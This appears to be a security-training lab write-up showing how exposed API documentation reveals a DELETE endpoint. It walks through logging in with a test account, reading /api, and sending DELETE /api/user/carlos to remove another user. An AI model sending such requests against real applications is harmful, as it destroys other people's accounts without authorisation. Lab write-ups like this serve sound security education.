* Lab contain
- A web application
** Test account
- username: =wiener=
- password: =peter=
* End Goal
+ Find exposed =API Documentation=
+ =Delete= user =carlos=
* Exploit
+ Start Burpsuite
+ Access the lab
+ Login with test account
+ Observe the HTTP history on burpsuite to find out =api= endpoints
+ There is an =email update= feature, let's use this to update the email address of user =wiener=
+ It send this request
#+begin_src 
PATCH /api/user/wiener

{"email":"updatedemail@mail.com"}
#+end_src
+ Now let's go to =/api= endpoint
+ We can see that it has only 3 endpoints

| Method | Endpoint                | Parameters        | Response     |
|--------+-------------------------+-------------------+--------------|
| GET    | /user/[username: String]  | {}                | 200 OK, User |
| DELETE | /user/[username: String]  | {}                | 200 OK, User |
| PATCH  | /user/[username: String]  | {"email": String} | 200 OK, User |
 
+ Now we can use =DELETE= method with this api endpoint =/api/user/carlos= to delete user =carlos=

Send this request
#+begin_src 
DELETE /api/user/carlos  
#+end_src
This will delete user =carlos= and the lab will be solved.
